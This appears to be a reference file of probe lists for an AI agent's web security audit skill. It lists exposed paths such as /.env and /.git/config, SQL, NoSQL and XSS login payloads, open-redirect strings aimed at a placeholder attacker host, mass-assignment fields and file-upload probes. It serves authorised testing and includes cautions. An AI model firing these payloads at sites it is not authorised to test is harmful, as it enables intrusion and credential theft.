# Payloads and probe lists

Reference lists for Steps 2, 4, and 5 of SKILL.md. Read this when you're actually running those
steps — no need to load it just to plan the audit.

## Common exposed paths (Step 2)

```
/.env
/.env.local
/.git/config
/.git/HEAD
/wp-config.php.bak
/backup.zip
/backup.sql
/config.php
/.htaccess
/admin
/wp-admin/
/wp-login.php
/phpmyadmin
/xmlrpc.php
/CHANGELOG.md
/readme.html
/server-status
/.well-known/security.txt
/robots.txt
/sitemap.xml
```

`scripts/recon.sh` already runs these against the fallback-fingerprinted baseline. Add
stack-specific paths once you know the tech: WordPress → `/wp-content/debug.log`,
`/wp-json/wp/v2/users`; Bitrix → `/bitrix/admin/`; Payload CMS → `/api/access`,
`/api/<collection>/login`; Laravel → `/.env`, `/storage/logs/laravel.log`, `/telescope`.

## Login/auth injection payloads (Step 4)

Test each against the **API endpoint directly**, not the HTML form (client-side `type="email"`
etc. will silently reject malformed input before it ever reaches the server, giving you a false
sense of safety).

**SQLi:**
```json
{"email": "' OR '1'='1' --", "password": "anything"}
{"email": "admin'--", "password": "x"}
{"email": "test@test.com' UNION SELECT 1,2,3--", "password": "x"}
```

**NoSQL / object injection** (Mongo-style operators smuggled through JSON):
```json
{"email": {"$gt": ""}, "password": {"$gt": ""}}
{"email": {"$ne": null}, "password": {"$ne": null}}
```

**XSS:**
```json
{"email": "<script>alert(1)</script>@test.com", "password": "x"}
{"email": "\"><img src=x onerror=alert(1)>@test.com", "password": "x"}
```

Every response should stay a generic error — no SQL error text, no different timing, no
reflection of the payload back unescaped.

## Open redirect payloads

Try on any parameter that looks like it controls a post-action destination
(`redirect`, `next`, `url`, `return`, `continue`, `callback`, `dest`):

```
?redirect=https://evil-redirect-test.example
?redirect=//evil-redirect-test.example
?redirect=/\evil-redirect-test.example
?next=https:evil-redirect-test.example
```

Check the `Location` header of the response — if it points at the attacker-controlled host, it's
a real open redirect (useful for phishing, sometimes for OAuth token theft).

## Mass-assignment / business-logic fields to try injecting

On any create/update endpoint (registration, booking, order, profile update), try adding fields
the client has no business setting, on top of the legitimate ones:

```
role, isAdmin, is_admin, admin, verified, is_verified, _verified
wallet, balance, credit, price, total, amount, total_price, discount
status ("confirmed" / "approved" / "paid" instead of default "pending"/"new")
```

Label any resulting test record unmistakably (e.g. `name: "SECTEST DoNotUse"`) so the owner can
find and delete it.

## File upload probes

If the site has any upload form (avatar, attachment, document):

1. Try uploading a file with a double extension or mismatched content-type:
   `shell.php.jpg`, `shell.svg` (SVG can carry embedded `<script>` — stored XSS if served inline
   and rendered, not downloaded), `test.php` with `Content-Type: image/png`.
2. Check what the server actually does: does it re-encode/strip images (safe), or store the raw
   bytes and serve them back with a content-type it trusts from the filename/client header
   (dangerous)?
3. Check where the file ends up — is the upload path guessable/enumerable, or served under a
   random unguessable name?

Don't upload anything that would actually execute if the check succeeds — proving "the server
accepted a `.php` file with `<?php echo 'test';` content and serves it back as-is with
`Content-Type: text/html`" is enough evidence; there's no need to prove code execution against a
real production box.
